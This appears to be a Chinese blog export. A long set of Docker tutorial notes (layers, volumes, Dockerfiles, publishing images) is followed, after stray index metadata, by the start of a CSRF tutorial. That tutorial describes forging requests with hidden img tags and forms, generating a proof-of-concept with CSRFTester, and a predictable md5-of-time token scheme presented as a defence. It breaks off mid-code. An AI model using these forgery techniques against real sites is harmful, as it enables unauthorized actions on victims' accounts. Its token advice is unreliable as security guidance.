下图中举了-个简单的例子,每个镜像层包含3个文件。而镜像包含了来自两个镜像层的6个文件。这两个镜像是没有冲突的，如果将它打包成镜像的时候，里面就会有六个文件，也就相当于有6层。![image-20200709101750617](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101750617.png)上图中的镜像层跟之前图中的略有区别,主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像。在外部看来整个镜像只有6个文件。这是因为最上层中的文件7是文件5的一个更新版本。所以文件7将文件5替换掉了，所以还是6层，这样就可以实现一些文件复用![image-20200709102140896](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102140896.png)这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为- -个新镜像层添加到镜像当中。Docker通过存储引擎(新版本采用快照机制)的方式来实现镜像层堆栈,并保证多镜像层对外展示为统-的文件系统。Linux.上可用的存储弓|擎有AUFS、Overlay2、 Device Mapper、Btrfs 以及ZFS。顾名思义,每种存储引擎都基于Linux中对应的文件系统或者块设备技术,诅每种存储引擎都有其独有的性能特点。Docker在Windows.上仅支持windowsfilter -种存储引擎,该引擎基于NTFS文件系统之上实现了分层和CoW[1]。下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并,对外提供统-的视图。![image-20200709102529485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102529485.png)Docker镜像都是只读的,当容器启动时, -个新的可写层被加载到镜像的顶部!上面这句话的意思![image-20200709164201727](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164201727.png)这一层就是我们通常说的容器层,容器之下的都叫镜像层!![image-20200709164833283](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164833283.png)##### docker镜像特点docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。##### Docker_镜像commit如果想要保存当前容器的状态，就可以通过commit来提交，获得一个镜像，可以看作为VM的快照功能docker_镜像commit操作:- docker commit 提交容器副本使之成为一个新的镜像 - &#96;docker run -it -p 8080:8080 tomcat&#96; - -p 主机端口:docker容器端口 - -P 随机分配端口 - i：交互 - t：终端- docker commit -m&#x3D;&quot;提交的描述信息&quot;-a&#x3D;&quot;作者&quot;容器ID要创建的目标镜像名:[标签名]##### 案例演示- 从Hub上下载tomcat镜像到本地并成功运行 - &#96;docekr run -it -p 8080:8080 tomcat&#96; - 使用&#96;docker ps&#96;查看端口，8888以为刚才这值得是8888当然这些端口都只是**映射端口** - ![image-20200509211850828](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211850828.png) ![image-20200509211823006](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211823006.png) ![image-20200509212302011](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212302011.png) 使用&#96;-P&#96;随机分配端口&#96;docker run -it -P tomcat&#96;端口号变成了32768 ![image-20200509212358609](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212358609.png) ![image-20200509214601158](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509214601158.png)- 故意删除上一步镜像生产tomcat容器的文档删除&#96;docs&#96;容器文档，再次访问8888页面，然后刷新![image-20200509221117054](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221117054.png)访问8888之后就返回404因为你将容器文档删除了![image-20200509221245167](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221245167.png)- 也即当前的tomcat运行实例是一个没有文档内容的容器，以它为模板commit一个没有doc的tomcat新镜像atguigu&#x2F;tomcat02 - 使用&#96;docker commit -a&#x3D;&quot;long&quot; -m&#x3D;&quot;del tomcat docs&quot; 2d73f0856d17 long&#x2F;tomcat02:1.2&#96; ![image-20200509222553460](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509222553460.png) 访问之后并没有找到 ![image-20200509223418689](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223418689.png) 直接拉取 tomcat ![image-20200509223555485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223555485.png) 访问7788地址，成功访问了，这个是默认的并不是我们新建的 ![image-20200509223621247](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223621247.png)- 启动我们的新镜像并和原来的对比 - 启动&#96;long&#x2F;tomcat02&#96;，它没有docs - 启动原来的tomcat，它有docs**补充：**使用&#96;docker run -d -p 6666:8080 tomcat&#96;，后台的方式启动，它并没有在前台返回日志。![image-20200509224259556](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224259556.png)在页面中访问6666端口依旧可以访问![image-20200509224419848](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224419848.png)#### Docker容器数据卷使用Docker时，通常需要保存数据，或者在多个容器之间共享数据，这就涉及Docker 容器的数据操作。目前主要有两种方法可以管理容器中的数据:数据卷和数据卷容器。 数据卷(Data Volume)：将容器中的数据直接映射到本地宿主机。数据卷容器(Data Volume Container):使用特定容器维护数据卷。 ##### 数据卷Docker的镜像是一系列只读层的组合，启动一个容器时，Docker加载镜像的所有只读 层，并向顶层添加读写层。这种设计提高了 Docker构建、存储和分发镜像的效率，节省了时 间和存储空间，但也存在以下问题。 - 容器中的文件以复杂的形式存储在宿主机上，在宿主机上不便于访问容器中的 文件。 - 多个容器之间的数据无法共享。 - 容器被删除，其产生的数据将丢失。 为了解决Docker在架构设计上的问题，引入了数据卷机制。数据卷可用于存储Docker 应用的数据以及Docker容器之间共享的数据。简单来说，数据卷的存在非常简单,可以绕 过默认的联合文件系统而以正常的文件或者目录的形式存在于宿主机中，即使被修改也不 会影响镜像。##### 使用Docker的数据卷可以实现以下功能。- 在容器启动时，数据卷被初始化;当容器使用的镜像在挂载点存在数据，则数据会被 拷贝到初始化后的数据卷中。 - 在不同的容器之间,数据卷可以被共享和重用。 - 数据卷可以在宿主和容器之间共享数据。 - 数据卷中的数据可在宿主机或容器内直接修改，修改完成后立即生效。 - 数据卷是持续性的，即使数据卷容器被删除,只要还有一个容器在使用该数据卷，数 据就不会被删除。 - 数据卷可以持久化数据，容器运行期间产生的数据并不会保存到镜像中，重新用此 镜像启动新的容器就会初始化镜像，会加一个全新的读写层来保存数据。Docker理念- 将运用与运行的环境打包形成容器运行，运行可以伴随着容器，但是我们对数据的要求希望是持久化的- 容器之间希望有可能共享数据![image-20200511205222360](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200511205222360.png)##### 使用数据卷&gt;方式一：直接使用命令来挂载 -v&#96;&#96;&#96;shell# -v 就好比 -p 的端口映射docker run -it -v 主机目录:容器内目录 12# 测试# 1、在home目录下做测试，先查看home目录下有没有东西 12# 2、使用以下命令，并进入容器的home文件查看里面内容docker run -it -v /home/test:/home centos /bin/bash 12# 3、发现没有内容，打开一个新的窗口，查看本机的home文件下是否有内容# 可以看到本地的home文件下已经生成了test文件，test文件中没有内容 1# 在容器中的home文件下随便进行操作，这里就创建个文件，查看本地home/test下时候也同样的出现了改文件 容器 本地 他是一个双向的，如果在本地修改文件，容器中也会进行同样的修改 实战：MySQL思考：mysql的数据持久化问题 123456789101112131415161718# 获取镜像docker pull mysql:5.7# 运行镜像，进行数据挂载~ # 安装启动mysql，需要配置密码docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7# 参数-d：后台运行-p：端口映射-v：数据卷挂载-e：环境配置# 官方测试 # -e 后面的MYSQL_ROOT_PASSWORD=密码 # 这个就是设置mysql的密码docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag# 启动成功后，我们在本地使用sqlyog来进行测试# sqlyog 连接到服务器的3310 --- 3310和容器内的3306映射 1# 在本地测试创建一个数据库，查看一下我们的映射路径是否成功 假设将我们的容器删除 发现我们挂载到本地的数据卷依旧没有丢失，这就实现了容器数据持久化功能！ 具名和匿名挂载12345678910# 匿名挂载-v 容器内路径！docker run -d -P --name nginx01 -v /etc/nginx nginx# 查看所有的 volume 的情况docker volume lsDRIVER VOLUME NAMElocal 358d04b6ef70c3c3c33abd7828ed32cffd78a445f402add1351cb20c8203594flocal c816c5026889b5ebfe1966c3658558348fbeed4aae4af1bb8a31d5714f916328# 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径 12345678910# 具名挂载docker run -d -P --name nginx02 -v long-nginx:/ect/nginx nginx# 查看 volume 情况root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker volume lsDRIVER VOLUME NAMElocal long-nginx# 通过 -v 卷名:容器内路径 # 卷名只是给他命名的名字# 查看一下这个卷 所有的docker容器内的卷，没有定制目录的情况下都是在/var/lib/docker/volumes/xxx/_data下面。 我们通过具名挂在可以方便的找 到我们的一个卷，大多数情况下在使用的具名挂载 1234# 区分具名挂载和匿名挂载，还有指定挂载-v 容器内路径 # 匿名挂载-v 卷名:容器内路径 # 具名挂载-v /宿主机路径:容器内路径 # 指定挂载 扩展： 123456789# 通过 -v 容器内路径：ro、rw 改变读写权限ro readonly # 只读rw readwrite # 可读可写# 一旦设定了容器权限，容器对我们挂载出来的内容就有限定了root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:ro nginxroot@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:rw nginx# ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作 初识DockerFiledockerfile就是用来构建docker 镜像的构建文件！命令脚本！ 通过这个脚本可以生成镜像，镜像是一层一层的，脚本就是一个一个的命令，每个命令都是一层！ 1234567891011# 创建一个dockerfile文件，名字可以随机 建议 Dockerfile# 文件中内容 指令（大写） 参数FROM centosVOLUME [\"volume01\",\"volume02\"]CMD echo \"----end----\"CMD /bin/bash# 这里的每一个命令，就是镜像的一层 1# 启动自己写的容器 这个卷和外部一定有一个同步的目录 进入我们的刚才自动生成的数据卷目录，新建一个文件 可以看到这个centos是个阉割版的clear都用不了 新建一个新的窗口，查看一下容器信息 正在运行 查看一下匿名挂载的路径 docker inspect 容器ID 找到Mounts，找到之前创建文件的volume01路径 复制进入，ls查看， 这种方法我们是非常常用的，因为我们通常要构造自己的镜像！ 假设构建镜像时没有挂载卷，需要手动挂载 -v 卷名:容器内路径 数据卷容器多个mysql同步数据 有一个子容器centos02和一个父容器centos01，我们需要要一个容器去挂载父容器，实现数据同步，所以需要centos02跟01实现一个挂载，所以要是用一个命令 --volumes-from通过这个方式就可以跟centos01数据同步上了。 谁去挂载谁称之为父容器，如果centos02一旦挂载了centos01，那么它们两个同步的数据卷内容就是同步的。而被挂载的所谓的父容器，他就叫做数据卷容器他有一个容器，但是他有一个挂载的功能，我们可以通过数据卷容器给其他人共享一些内容，或者两个容器/多个容器之间实行容器的共享 1# 启动3个容器，通过我们刚才自己写的镜像启动 12# 使用该命令将数据卷02挂载到数据卷01实现数据同步root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker run -it --name docker02 --volumes-from docker01 long/centos:1.0 新建一个窗口分别进入容器1和容器2，查看当前地址下的目录 在容器1进入volume01，在里面新建一个文件，查看容器2的volume01是否也有该文件 这样成功地返回了容器1中新建的内容，当然如果在创建一个容器3都是一个道理 1# 删除docker01，查看docker02和03发现还可以访问这个文件 这是一种备份机制而不是共享机制，他这里面的概念是拷贝的概念，双向拷贝的概念。 如果将容器1删除了，但是容器2和3已经将里面的共享卷拷贝出来了 多个mysql同步数据 1234root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker run -d -p 3310:3306 -v -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7# 这个时候可以实现两个容器数据同步 结论： 容器之间可以做一些配置信息的传递，数据卷容器的生命周期一只持续到没有容器使用为之。 但是一旦持久化了本地，这个时候，本地的数据是不会删除的 DockerFile介绍dockerfile是用来构建docker镜像的文件！命令参数脚本！ 构建步骤： 1、编写一个 dockerfile 文件 2、docker build 构建称为一个镜像 3、docker run 运行镜像 4、docker push 发布镜像（DockerHub、阿里云镜像仓库） 很多官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像！ 因为每个人的需求不同，比如我们要加 jdk + tomcat + Mysql + reid。 既然官方可以制作镜像，那么我们也可以 DockerFile构建过程基础知识1、每个保留关键字（指令）都是必须是大写字母 2、执行从上到下顺序执行 3、# 表示注释 4、每一个指令都会创建提交一个新的镜像层，并提交 dockerfile是面向开发的，我们以后要发布项目，做镜像，就需要编写dockerfile文件，这个文件十分简单！ Docker镜像逐渐成为企业交付的标准，必须要掌握！ 步骤： Dockerfile：构建稳健，定义了一切的步骤，源代码 DockerImages：通过DockerFile构建生成的镜像，最终发布和运行的产品 Docker容器：容器就是镜像运行起来提供服务器 DockerFile的指令123456789101112FROM # 基础镜像，一切从这里开始构建 centosMAINTAINER # 镜像是谁写的，姓名 + 邮箱RUN # 镜像构建的时候需要运行的命令ADD # 步骤，tomcat镜像，这个tomcat！ 添加内容WORKDIR # 镜像的工作目录VOLUME # 挂载的目录位置EXPOSE # 指定暴露端口CMD # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代ENTRYPOINT # 指定这个容器启动的时候要运行的命令，可以追加命令ONBUILD # 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD 的指令，触发指令COPY # 类似ADD，将我们文件拷贝到镜像中ENV # 构建的时候设置环境变量 CMD命令和ENTRYPOINT的区别。 例如：在CMD中构造了 ls -a，然后docker run执行了容器，在容器外使用ls -l或者-l的话就会将容器内的 -a替换掉，如果是ENTRYPOINT的话就会在后面追加，ls -a -l 这样。 实战测试docker hub 中99%的镜像都是从FROM scratch开始的，然后配置需要的软件和配置来进行构建。 创建一个自己的centos 12345678910111213141516171819202122232425# 1、编写dockerfile的文件root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# cat mycentos FROM centosMAINTAINER long&lt;1927353788@qq.ocm&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vimRUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD echo \"----end----\"CMD /bin/bash# 2、通过这个文件构建镜像# 命令： docker build -f dockerfile的文件路径 -t 镜像名:版本号 .成功返回Successfully built 789e8d69df33Successfully tagged mydocker:1.0# 3、测试运行 对比：之前原来的centos pwd 原centos的工作目录是根目录： 自己构建的centos我们设置的根目录是/usr/local： vim 原centos中的vim命令不能使用： 自己构建的centos的vim命令可以使用： ifconfig 原centos的ifconfig命令不能使用： 自己构建的centos的ifconfig命令可以使用： 我们可以列出本地本地进行的变更历史 1docker history 容器ID CMD和 ENTRYPOINT的区别 12CMD # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代ENTRYPOINT # 指定这个容器启动的时候要运行的命令，可以追加命令 测试CMD 123456789101112131415161718192021222324252627282930313233343536373839404142# 编写dockerfile 文件root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd/bin/sh: [ls.-a]: command not foundroot@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi cmd FROM centosCMD [\"ls\",\"-a\"]# 构建镜像root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f cmd -t mycmd .Sending build context to Docker daemon 3.072kBStep 1/2 : FROM centos ---&gt; 831691599b88Step 2/2 : CMD [\"ls\",\"-a\"] ---&gt; Running in d8930564e002Removing intermediate container d8930564e002 ---&gt; deb7bf9eca04Successfully built deb7bf9eca04Successfully tagged mycmd:latest# run运行，发现我们的ls -a命令生效root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd. .dockerenv dev home lib64 media opt root sbin sys usr.. bin etc lib lost+found mnt proc run srv tmp var# 我们想要追加一个命令 -l la-alroot@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 -ldocker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused \"exec: \\\"-l\\\": executable file not found in $PATH\": unknown.ERRO[0000] error waiting for container: context canceled # cmd的情况下 -l 替换么CMD [\"ls\",\"-a\"]命令，-l 不是命令所以报错# 将格式后面加上 ls -al才能执行，root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 ls -altotal 56drwxr-xr-x 1 root root 4096 Jul 12 15:03 .drwxr-xr-x 1 root root 4096 Jul 12 15:03 ..-rwxr-xr-x 1 root root 0 Jul 12 15:03 .dockerenvlrwxrwxrwx 1 root root 7 May 11 2019 bin -&gt; usr/bindrwxr-xr-x 5 root root 360 Jul 12 15:03 devdrwxr-xr-x 1 root root 4096 Jul 12 15:03 etcdrwxr-xr-x 2 root root 4096 May 11 2019 home 测试ENTRYPOINT 123456789101112131415161718192021222324252627282930313233# 编写一个Entrypoint的dockerfile文件root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi entrypointFROM centosENTRYPOINT [\"ls\",\"-a\"]# 构建镜像root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f entrypoint -t myentrypoint .Sending build context to Docker daemon 4.096kBStep 1/2 : FROM centos ---&gt; 831691599b88Step 2/2 : ENTRYPOINT [\"ls\",\"-a\"] ---&gt; Running in 68d1dab6df2fRemoving intermediate container 68d1dab6df2f ---&gt; 4a4072bdbcc6Successfully built 4a4072bdbcc6Successfully tagged myentrypoint:latest# 运行镜像root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6. .dockerenv dev home lib64 media opt root sbin sys usr.. bin etc lib lost+found mnt proc run srv tmp var# 加上参数，发现直接运行了，说明参数追加了，并不是像CMD一样报错root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6 -ltotal 56drwxr-xr-x 1 root root 4096 Jul 12 15:06 .drwxr-xr-x 1 root root 4096 Jul 12 15:06 ..-rwxr-xr-x 1 root root 0 Jul 12 15:06 .dockerenvlrwxrwxrwx 1 root root 7 May 11 2019 bin -&gt; usr/bindrwxr-xr-x 5 root root 360 Jul 12 15:06 devdrwxr-xr-x 1 root root 4096 Jul 12 15:06 etcdrwxr-xr-x 2 root root 4096 May 11 2019 home... 实战：tomcat镜像1、准备镜像文件 tomcat 压缩包，jdk的压缩包！ 百度搜索下载就行 2、编写dockerfile文件，官方命名Dockerfile，build会自动寻找这个文件，就不需要-f指定了！ 新建一个readme.txt，在vim Dockerfile 12345678910111213141516171819202122232425FROM centosMAINTAINER long&lt;1927353788@qq.comCOPY readme.txt /usr/local/readme.txtADD jdk-8u60-linux-x64.tar.gz /usr/local/ADD apache-tomcat-9.0.37.tar.gz /usr/local/RUN yum -y install vimRUN yum -y install net-toolsENV MYPATH /usr/localWORKDIR $MYPATH# java安装目录ENV JAVA_HOME /usr/local/jdk1.8.0_60ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar# tomcat默认目录ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.37ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.37ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-9.0.37/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.37/bin/logs/catalina.out 3、构建镜像 因为Dockerfile名字是官方名字，所以我们不需要写-f了 1# docker build -t diytomcat . 4、启动镜像 1root@iZ2zeb24c7i2ydyvoyobm2Z:/home/tomcat# docker run -d -p 9090:8080 --name longtomcat -v /home/tomcat/test:/usr/local/apache-tomcat-9.0.37/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.37/logs diytomcat 使用命令curl localhost:9090测试看看是否能返回源码，如果返回说明成功 5、访问测试 直接在页面输入公网地址测试/test/，因为我们之前是配置的test 6、发布项目（由于做了卷挂载，我们直接在本地编写项目皆可以） xml 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;web-app xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" version=\"2.5\"&gt; &lt;/web-app&gt; jsp 123456789101112131415&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;hello,long &lt;/title&gt; &lt;/head&gt; &lt;body&gt; Hello World!&lt;br/&gt; &lt;% System.out.println(\"---- my test web logs ----\"); %&gt; &lt;/body&gt; &lt;/html&gt; 发现：项目部署成功，可以直接访问ok 发布镜像 Docker Hub 1、地址：https://hub.docker.com/ 注册自己的账号 2、确定账号可以登录 3、在我们服务器上提交自己的镜像 1234567891011121314151617181920root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login --helpUsage: docker login [OPTIONS] [SERVER]Log in to a Docker registry.If no server is specified, the default is defined by the daemon.Options: -p, --password string Password --password-stdin Take the password from stdin -u, --username string Username root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login -u t4rbPassword: WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeeded 4、登陆完毕后就可以提交镜像了。使用docker push命令 12345678910111213141516171819202122232425262728293031# push自己的镜像到服务器上，TAG是latest使用docker tag进行更改root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push diytomcatThe push refers to repository [docker.io/library/diytomcat]8224c93eb99b: Preparing d84326805ba8: Preparing bb62c18f4698: Preparing 661cc4178d6d: Preparing e1c4fa244dba: Preparing eb29745b8228: Waiting denied: requested access to the resource is denied #被拒绝了# push镜像问题，这是因为该镜像的TAG是latestroot@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/diytomcat:2.0The push refers to repository [docker.io/t4rb/diytomcat]An image does not exist locally with the tag: t4rb/diytomcat# 更改完可以看到多了一个镜像，并且TAG变成了1.0root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEdiytomcat latest ee410e9aa82d 4 hours ago 676MBt4rb/tomcat 1.0 ee410e9aa82d 4 hours ago 676MB# 更改完成再次进行push，这样就可以成功提交了root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/tomcatThe push refers to repository [docker.io/t4rb/tomcat]8224c93eb99b: Pushing 1.212MB/22.76MBd84326805ba8: Pushing 1.664MB/57.2MBbb62c18f4698: Pushing 703.5kB/15.63MB661cc4178d6d: Pushing 1.077MB/364.8MBe1c4fa244dba: Pushed eb29745b8228: Pushing 544.8kB/215.3MB 提交的时候也是按照层级来提交的 Docker 发布到阿里云服务上 1、登录阿里云 2、找到容器镜像服务 3、点击容器仓库，创建命名空间 4、创建容器镜像 要选择本地 5、浏览阿里云 小结：","categories":[],"tags":[]},{"title":"CSRF_SSRF","slug":"CSRF_SSRF","date":"2020-05-03T07:59:26.635Z","updated":"2020-05-03T07:58:14.000Z","comments":true,"path":"2020/05/03/CSRF_SSRF/","link":"","permalink":"https://zhanqiaozai.github.io/2020/05/03/CSRF_SSRF/","excerpt":"","text":"CSRF漏洞1、CSRF漏洞定义跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 它与XSS非常不同，XSS是利用站点内的信任用户，而CSRF则通过伪装成信任用户请求受信任网站。与XSS相比，CSRF攻击往往不大流行(因此对其进行防御资源也相对较少)也难以防范，所以被认为比XSS更具危害性。 XSS与CSRF区别： 1、XSS利用站点内的信任用户，盗取cookie； 2、CSRF通过伪装成受信任用户请求信任的网站 2、CSRF漏洞原理利用目标用户的合法身份，以目标用户的名义执行某些非法操作。 3、CSRF漏洞代码分析123456&lt;?php &#x2F;&#x2F; 会话验证 $user &#x3D; $_GET[&quot;user&quot;]; $money&#x3D;$_GET[&quot;money&quot;]; &#x2F;&#x2F; 转账操作?&gt; CSRF成功利用条件: 用户已经登陆系统 用户访问对应URL 4、CSRF漏洞利用先修改密码 红线处是更改后的RUL，没有标记的URL是初始URL 访问红线的URL，显示更改了密码 尝试使用之前的hack登录，发现密码错误了 使用123登录尝试一下，发现成功登录 无防护的CSRFGET型CSRF利用构造GET型URL，提交username和password参数，以此来新建对应的用户名和密码 隐蔽利用img标签的src属性 打开这个URL，显示中奖了 在进行查看，成功添加进去了 POST型CSRF利用设置表单用于提交。例如：&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;111&quot;/&gt; 打开url 点击我要中奖了，进行跳转并成功输出 CSRF漏洞自动化探测1、手动探测原理手动探测原理在于探测web应用程序具有防止CSRF的措施 防御措施 如果web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞 手动修改需要修改很多东西。 2、自动化探测工具介绍CSRFTester是一款CSRF漏洞测试工具 3、自动化探测工具使用1、设置浏览器代理：127.0.0.1:8008 2、登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表面存在CSRF漏洞 3、生产POC代码 点击截断 确定修改 抓取之后进行修改 点击右下角Generate HTML 另存为生成一个POC 打开index返回一个true 再回到会员页面，成功创建了一个新的会员，由此可以判断页面存在CSRF漏洞，并成功利用这个漏洞添加了用户名 4、利用CSRF漏洞使用服务器搭建CSRF POC访问页面 修改内容，上面还有一个地址也要修改 点击登录 登录之后返回true 查看会员列表 如果再次重复提交的话，会报错 CSRF漏洞Token防御介绍1、漏洞修补逻辑分析CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。 原因：用户登录之后服务器就会生成对应的cookie进行身份验证，验证之后就可以进行对应操作，而存在CSRF时用户在点击了构造的CSRF POC那么点击之后发送对应的请求到服务器，服务器接收到cookie（因为用户已经登录），cookie会随着请求一起发送到服务器，服务器确定了他是一个合法用户，但是并不能确定，它是用户自己操作还是用户点击了POC进行操作，而使得这种情况下就存在了CSRF漏洞 如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作。不正确不执行操作。 一般情况下，给予的令牌会写入表单中隐藏域的value值中，随着表单内容进行提交。 2、简单代码模型分析 1、首先要有个登录界面login.php，登录成功执行操作，执行登录后的（增删改查） 这个过程中执行这些操作都需要提交对应身份验证的cookie值，有了cookie值才能进行操作，否则连第一步简单操作都无法进行 如果没有登录而直接执行对应的操作，这时候就会自动跳回到登录界面，或者给出其他的提示 远程构造CSRF利用POC，那么直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作。并给出提示内容 3、生成Token代码分析Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。 123456789例如：function generateToken()&#123;&#x2F;&#x2F; 获取简单的日期（年、月、日） $salt&#x3D;&quot;test&quot;.date(&quot;Y&#x2F;m&#x2F;d&quot;);&#x2F;&#x2F; 进行md5加密 $token&#x3D;md5($salt);&#x2F;&#x2F; 返回值 return $token;&#125; 调用函数查看生成的token 在浏览器打开，然后多次运行发现Token值不发生变化 如果生成的Token值都一样就没有防御措施了 为了这种唯一性设置对应的时间，不是年月日，而是时分秒，生成字符串不断变化，而且是唯一 123456789例如：function generateToken()&#123;&#x2F;&#x2F; 获取简单的日期（年、月、日） $salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);&#x2F;&#x2F; 进行md5加密 $token&#x3D;md5($salt);&#x2F;&#x2F; 返回值 return $token;&#125; 再次在刷新浏览器，发现每一秒的Token值都是不一样的 当前可以将$salt中的test替换成任意的字符串，尽可能复杂而不容易被破解，这个test容易被破解 这样生成的Token就不容易被破解出来，因为是加上当前的时间和字符串的话，如果简单很有可能被猜解 123456789例如：function 